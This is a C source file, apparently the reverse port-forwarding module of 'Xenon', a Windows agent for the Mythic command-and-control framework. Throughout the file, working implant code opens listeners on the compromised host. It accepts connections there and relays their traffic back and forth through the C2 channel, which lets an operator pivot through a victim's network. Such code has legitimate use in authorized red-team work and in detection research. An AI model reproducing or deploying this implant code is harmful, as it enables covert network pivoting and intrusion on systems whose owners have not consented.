#include "Tasks/Tunnel.h"

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#include "Xenon.h"
#include "Package.h"
#include "Parser.h"
#include "Task.h"
#include "Utils.h"
#include "Config.h"

#ifdef INCLUDE_CMD_RPORTFWD

static UINT32 g_RportfwdNextId = 0;

/**
 * @brief Generate a unique server_id for a new rportfwd connection.
 *
 * @return UINT32 Non-zero server_id
 */
static UINT32 RportfwdGenerateServerId()
{
    UINT32 serverId = 0;

    do
    {
        serverId = (GetTickCount() << 16) ^ (++g_RportfwdNextId);
    } while (serverId == 0);

    return serverId;
}

/**
 * @brief Handle rportfwd start/stop command from Mythic.
 *
 * @param[in] taskUuid Task's UUID
 * @param[inout] arguments PARSER struct containing task data.
 * @return VOID
 */
VOID Rportfwd(PCHAR taskUuid, PPARSER arguments)
{
    UINT32  nbArg       = 0;
    SIZE_T  actionLen   = 0;
    PCHAR   action      = NULL;
    UINT32  port        = 0;
    SIZE_T  remoteIpLen = 0;
    PCHAR   remoteIp    = NULL;
    UINT32  remotePort  = 0;
    PPackage output     = NULL;
    BOOL    success     = FALSE;

    nbArg = ParserGetInt32(arguments);
    if (nbArg == 0)
    {
        PackageComplete(taskUuid, NULL);
        return;
    }

    action  = ParserGetString(arguments, &actionLen);
    port    = ParserGetInt32(arguments);

    if (nbArg > 2)
    {
        remoteIp = ParserGetString(arguments, &remoteIpLen);
    }

    if (nbArg > 3)
    {
        remotePort = ParserGetInt32(arguments);
    }

    _dbg("[RPORTFWD] Received command action=%s port=%u remote=%s:%u", action ? action : "(null)", port, remoteIp ? remoteIp : "(null)", remotePort);

    output = PackageInit(0, NULL);

    if (action != NULL && strcmp(action, "stop") == 0)
    {
        success = RportfwdStopListener(port);
        if (success)
        {
            PackageAddFormatPrintf(output, FALSE, ":%u -> %s:%u\n", port, remoteIp, remotePort);
        }
        else
        {
            PackageAddFormatPrintf(output, FALSE, "Not found :%u\n", port);
        }
    }
    else
    {
        success = RportfwdListen(port);
        if (success)
        {
            PackageAddFormatPrintf(output, FALSE, ":%u -> %s:%u\n", port, remoteIp, remotePort);
        }
        else
        {
            PackageAddFormatPrintf(output, FALSE, "Failed to add :%u\n", port);
        }
    }

    PackageComplete(taskUuid, output);
}

/**
 * @brief Find a reverse port forward connection by server_id.
 *
 * @param[in] serverId The server_id to search for
 * @return PRPORTFWD_CONN Pointer to connection or NULL if not found
 */
PRPORTFWD_CONN RportfwdFindConnection(UINT32 serverId)
{
    PRPORTFWD_CONN current = (PRPORTFWD_CONN)xenonConfig->RportfwdConnections;

    while (current)
    {
        if (current->ServerId == serverId)
        {
            return current;
        }
        current = current->Next;
    }

    return NULL;
}

/**
 * @brief Find a reverse port forward listener by port.
 *
 * @param[in] port Local listen port
 * @return PRPORTFWD_LISTENER Pointer to listener or NULL if not found
 */
PRPORTFWD_LISTENER RportfwdFindListener(UINT32 port)
{
    PRPORTFWD_LISTENER current = (PRPORTFWD_LISTENER)xenonConfig->RportfwdListeners;

    while (current)
    {
        if (current->Port == port)
        {
            return current;
        }
        current = current->Next;
    }

    return NULL;
}

/**
 * @brief Start listening on a local port for reverse port forward connections.
 *
 * @param[in] port Local port to bind
 * @return BOOL TRUE on success, FALSE on failure
 */
BOOL RportfwdListen(UINT32 port)
{
    PRPORTFWD_LISTENER listener = NULL;
    SOCKET               sock   = INVALID_SOCKET;
    WSADATA              wsaData;
    struct sockaddr_in   addr;
    u_long               mode   = 1;
    int                  opt    = 1;

    if (RportfwdFindListener(port) != NULL)
    {
        _err("[RPORTFWD] Listener already exists on port %u", port);
        return FALSE;
    }

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        _err("[RPORTFWD] WSAStartup failed: %d", WSAGetLastError());
        return FALSE;
    }

    sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET)
    {
        _err("[RPORTFWD] WSASocketA failed: %d", WSAGetLastError());
        return FALSE;
    }

    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port = htons((UINT16)port);

    if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR)
    {
        _err("[RPORTFWD] bind failed on port %u: %d", port, WSAGetLastError());
        closesocket(sock);
        return FALSE;
    }

    if (listen(sock, RPORTFWD_LISTEN_BACKLOG) == SOCKET_ERROR)
    {
        _err("[RPORTFWD] listen failed on port %u: %d", port, WSAGetLastError());
        closesocket(sock);
        return FALSE;
    }

    if (ioctlsocket(sock, FIONBIO, &mode) == SOCKET_ERROR)
    {
        _err("[RPORTFWD] ioctlsocket failed: %d", WSAGetLastError());
        closesocket(sock);
        return FALSE;
    }

    listener = (PRPORTFWD_LISTENER)LocalAlloc(LPTR, sizeof(RPORTFWD_LISTENER));
    if (listener == NULL)
    {
        _err("[RPORTFWD] Failed to allocate RPORTFWD_LISTENER");
        closesocket(sock);
        return FALSE;
    }

    listener->Port = port;
    listener->ListenSocket = sock;
    listener->Next = NULL;

    if (xenonConfig->RportfwdListeners == NULL)
    {
        xenonConfig->RportfwdListeners = listener;
    }
    else
    {
        PRPORTFWD_LISTENER current = (PRPORTFWD_LISTENER)xenonConfig->RportfwdListeners;
        while (current->Next != NULL)
        {
            current = current->Next;
        }
        current->Next = listener;
    }

    _dbg("[RPORTFWD] Listening on port %u", port);
    return TRUE;
}

/**
 * @brief Stop a listener and close all connections on that port.
 *
 * @param[in] port Local listen port
 * @return BOOL TRUE if listener was found and stopped
 */
BOOL RportfwdStopListener(UINT32 port)
{
    PRPORTFWD_LISTENER current = (PRPORTFWD_LISTENER)xenonConfig->RportfwdListeners;
    PRPORTFWD_LISTENER prev    = NULL;
    PRPORTFWD_CONN     conn    = NULL;
    PRPORTFWD_CONN     connPrev = NULL;
    PRPORTFWD_CONN     connNext = NULL;
    BOOL               found   = FALSE;

    while (current)
    {
        if (current->Port == port)
        {
            if (current->ListenSocket != INVALID_SOCKET)
            {
                closesocket(current->ListenSocket);
                current->ListenSocket = INVALID_SOCKET;
            }

            if (prev == NULL)
            {
                xenonConfig->RportfwdListeners = current->Next;
            }
            else
            {
                prev->Next = current->Next;
            }

            LocalFree(current);
            found = TRUE;
            break;
        }

        prev = current;
        current = current->Next;
    }

    conn = (PRPORTFWD_CONN)xenonConfig->RportfwdConnections;
    connPrev = NULL;

    while (conn)
    {
        connNext = conn->Next;

        if (conn->Port == port)
        {
            RportfwdSendResponse(conn->ServerId, conn->Port, NULL, 0, TRUE);

            if (conn->Socket != INVALID_SOCKET)
            {
                shutdown(conn->Socket, SD_BOTH);
                closesocket(conn->Socket);
            }

            if (connPrev == NULL)
            {
                xenonConfig->RportfwdConnections = connNext;
            }
            else
            {
                connPrev->Next = connNext;
            }

            LocalFree(conn);
        }
        else
        {
            connPrev = conn;
        }

        conn = connNext;
    }

    if (found)
    {
        _dbg("[RPORTFWD] Stopped listener on port %u", port);
    }

    return found;
}

/**
 * @brief Remove and cleanup a reverse port forward connection by server_id.
 *
 * @param[in] serverId The server_id of the connection to remove
 * @return BOOL TRUE if removed, FALSE if not found
 */
BOOL RportfwdRemove(UINT32 serverId)
{
    PRPORTFWD_CONN current = (PRPORTFWD_CONN)xenonConfig->RportfwdConnections;
    PRPORTFWD_CONN prev    = NULL;

    while (current)
    {
        if (current->ServerId == serverId)
        {
            _dbg("[RPORTFWD] Removing connection server_id: %u", serverId);

            if (current->Socket != INVALID_SOCKET)
            {
                shutdown(current->Socket, SD_BOTH);
                closesocket(current->Socket);
            }

            if (prev == NULL)
            {
                xenonConfig->RportfwdConnections = current->Next;
            }
            else
            {
                prev->Next = current->Next;
            }

            LocalFree(current);
            return TRUE;
        }

        prev = current;
        current = current->Next;
    }

    return FALSE;
}

/**
 * @brief Send reverse port forward response data to Mythic.
 *
 * @param[in] serverId The server_id for this response
 * @param[in] port Local listen port
 * @param[in] data The data to send (can be NULL)
 * @param[in] dataLen Length of data
 * @param[in] exitFlag Whether connection should be closed
 */
VOID RportfwdSendResponse(UINT32 serverId, UINT32 port, PBYTE data, UINT32 dataLen, BOOL exitFlag)
{
    PPackage package = PackageInit(NULL, FALSE);

    PackageAddByte(package, RPORTFWD_DATA);
    PackageAddInt32(package, serverId);
    PackageAddInt32(package, port);
    PackageAddInt32(package, dataLen);
    if (data != NULL && dataLen > 0)
    {
        PackageAddBytes(package, data, dataLen, FALSE);
    }
    PackageAddByte(package, exitFlag ? 0x01 : 0x00);

    PackageQueue(package);

    _dbg("[RPORTFWD] Queued response: server_id=%u, port=%u, len=%u, exit=%d",
         serverId, port, dataLen, exitFlag);
}

/**
 * @brief Accept new inbound connections on all active listeners.
 */
static VOID RportfwdAccept()
{
    PRPORTFWD_LISTENER listener = (PRPORTFWD_LISTENER)xenonConfig->RportfwdListeners;
    struct sockaddr_in clientAddr;
    int                addrLen = sizeof(clientAddr);

    while (listener)
    {
        SOCKET clientSock = accept(listener->ListenSocket, (struct sockaddr*)&clientAddr, &addrLen);

        if (clientSock == INVALID_SOCKET)
        {
            DWORD err = WSAGetLastError();
            if (err != WSAEWOULDBLOCK)
            {
                _err("[RPORTFWD] accept failed on port %u: %d", listener->Port, err);
            }
        }
        else
        {
            PRPORTFWD_CONN conn = NULL;
            u_long         mode = 1;
            BYTE           buffer[RPORTFWD_BUFFER_SIZE];
            int            bytesRead = 0;
            UINT32         serverId  = RportfwdGenerateServerId();

            if (ioctlsocket(clientSock, FIONBIO, &mode) == SOCKET_ERROR)
            {
                _err("[RPORTFWD] ioctlsocket failed on accepted socket: %d", WSAGetLastError());
                closesocket(clientSock);
                listener = listener->Next;
                continue;
            }

            conn = (PRPORTFWD_CONN)LocalAlloc(LPTR, sizeof(RPORTFWD_CONN));
            if (conn == NULL)
            {
                _err("[RPORTFWD] Failed to allocate RPORTFWD_CONN");
                closesocket(clientSock);
                listener = listener->Next;
                continue;
            }

            conn->ServerId = serverId;
            conn->Port = listener->Port;
            conn->Socket = clientSock;
            conn->Connected = TRUE;
            conn->Next = NULL;

            if (xenonConfig->RportfwdConnections == NULL)
            {
                xenonConfig->RportfwdConnections = conn;
            }
            else
            {
                PRPORTFWD_CONN current = (PRPORTFWD_CONN)xenonConfig->RportfwdConnections;
                while (current->Next != NULL)
                {
                    current = current->Next;
                }
                current->Next = conn;
            }

            _dbg("[RPORTFWD] Accepted connection server_id=%u on port %u", serverId, listener->Port);

            bytesRead = recv(clientSock, (char*)buffer, sizeof(buffer), 0);
            if (bytesRead > 0)
            {
                RportfwdSendResponse(serverId, listener->Port, buffer, (UINT32)bytesRead, FALSE);
            }
            else if (bytesRead == 0)
            {
                RportfwdSendResponse(serverId, listener->Port, NULL, 0, TRUE);
                RportfwdRemove(serverId);
            }
            else
            {
                DWORD err = WSAGetLastError();
                if (err != WSAEWOULDBLOCK)
                {
                    _err("[RPORTFWD] Initial recv failed: %d", err);
                    RportfwdSendResponse(serverId, listener->Port, NULL, 0, TRUE);
                    RportfwdRemove(serverId);
                }
                else
                {
                    RportfwdSendResponse(serverId, listener->Port, NULL, 0, FALSE);
                }
            }
        }

        listener = listener->Next;
    }
}

/**
 * @brief Process incoming reverse port forward data from Mythic.
 *
 * @param[in] parser Parser containing rportfwd data messages
 */
VOID RportfwdProcessData(PPARSER parser)
{
    SIZE_T dataLen  = 0;
    UINT32 serverId = 0;
    PBYTE  data     = NULL;
    BYTE   exitFlag = 0;
    UINT32 port     = 0;
    UINT32 numParams = 0;
    PRPORTFWD_CONN conn = NULL;

    if (parser == NULL || parser->Buffer == NULL)
        return;

    numParams = ParserGetInt32(parser);
    if (numParams == 0)
        return;

    serverId = ParserGetInt32(parser);
    data = ParserGetBytes(parser, &dataLen);
    exitFlag = ParserGetByte(parser);
    port = ParserGetInt32(parser);

    _dbg("[RPORTFWD] Processing data: server_id=%u, port=%u, len=%zu, exit=%d",
         serverId, port, dataLen, exitFlag);

    conn = RportfwdFindConnection(serverId);
    if (conn == NULL)
    {
        _err("[RPORTFWD] Connection not found for server_id=%u", serverId);
        if (exitFlag)
        {
            RportfwdSendResponse(serverId, port, NULL, 0, TRUE);
        }
        return;
    }

    if (dataLen > 0)
    {
        int bytesSent = send(conn->Socket, (char*)data, (int)dataLen, 0);
        if (bytesSent == SOCKET_ERROR)
        {
            DWORD err = WSAGetLastError();
            if (err != WSAEWOULDBLOCK)
            {
                _err("[RPORTFWD] Send failed: %d", err);
                RportfwdSendResponse(serverId, conn->Port, NULL, 0, TRUE);
                RportfwdRemove(serverId);
                return;
            }
        }
        else
        {
            _dbg("[RPORTFWD] Forwarded %d bytes to local client", bytesSent);
        }
    }

    if (exitFlag)
    {
        _dbg("[RPORTFWD] Exit flag set, closing connection server_id=%u", serverId);
        RportfwdSendResponse(serverId, conn->Port, NULL, 0, TRUE);
        RportfwdRemove(serverId);
    }
}

/**
 * @brief Push outbound reverse port forward data to Mythic.
 *        Called from TaskRoutine() to accept new connections and read from active ones.
 */
VOID RportfwdPush()
{
    PRPORTFWD_CONN current = (PRPORTFWD_CONN)xenonConfig->RportfwdConnections;
    PRPORTFWD_CONN prev    = NULL;
    BYTE           buffer[RPORTFWD_BUFFER_SIZE];
    UINT32         numReads = 0;

    RportfwdAccept();

    while (current != NULL)
    {
        PRPORTFWD_CONN next = current->Next;
        BOOL shouldRemove = FALSE;

        if (numReads >= MAX_RPORTFWD_READS_PER_LOOP)
            break;

        if (current->Socket == INVALID_SOCKET || !current->Connected)
        {
            shouldRemove = TRUE;
        }
        else
        {
            u_long bytesAvailable = 0;

            if (ioctlsocket(current->Socket, FIONREAD, &bytesAvailable) == SOCKET_ERROR)
            {
                DWORD err = WSAGetLastError();
                _err("[RPORTFWD] ioctlsocket FIONREAD failed: %d", err);
                RportfwdSendResponse(current->ServerId, current->Port, NULL, 0, TRUE);
                shouldRemove = TRUE;
            }
            else if (bytesAvailable > 0)
            {
                int bytesRead = recv(current->Socket, (char*)buffer, sizeof(buffer), 0);

                if (bytesRead > 0)
                {
                    _dbg("[RPORTFWD] Received %d bytes from local client (server_id=%u)",
                         bytesRead, current->ServerId);
                    RportfwdSendResponse(current->ServerId, current->Port, buffer, (UINT32)bytesRead, FALSE);
                    numReads++;
                }
                else if (bytesRead == 0)
                {
                    _dbg("[RPORTFWD] Connection closed by local client (server_id=%u)", current->ServerId);
                    RportfwdSendResponse(current->ServerId, current->Port, NULL, 0, TRUE);
                    shouldRemove = TRUE;
                }
                else
                {
                    DWORD err = WSAGetLastError();
                    if (err != WSAEWOULDBLOCK)
                    {
                        _err("[RPORTFWD] recv failed: %d (server_id=%u)", err, current->ServerId);
                        RportfwdSendResponse(current->ServerId, current->Port, NULL, 0, TRUE);
                        shouldRemove = TRUE;
                    }
                }
            }
            else
            {
                int error = 0;
                int len = sizeof(error);

                if (getsockopt(current->Socket, SOL_SOCKET, SO_ERROR, (char*)&error, &len) == SOCKET_ERROR || error != 0)
                {
                    _dbg("[RPORTFWD] Socket error detected (server_id=%u)", current->ServerId);
                    RportfwdSendResponse(current->ServerId, current->Port, NULL, 0, TRUE);
                    shouldRemove = TRUE;
                }
            }
        }

        if (shouldRemove)
        {
            UINT32 serverId = current->ServerId;

            if (current->Socket != INVALID_SOCKET)
            {
                shutdown(current->Socket, SD_BOTH);
                closesocket(current->Socket);
            }

            if (prev == NULL)
            {
                xenonConfig->RportfwdConnections = next;
            }
            else
            {
                prev->Next = next;
            }

            LocalFree(current);
            _dbg("[RPORTFWD] Removed connection server_id=%u", serverId);
        }
        else
        {
            prev = current;
        }

        current = next;
    }
}

#endif  // INCLUDE_CMD_RPORTFWD
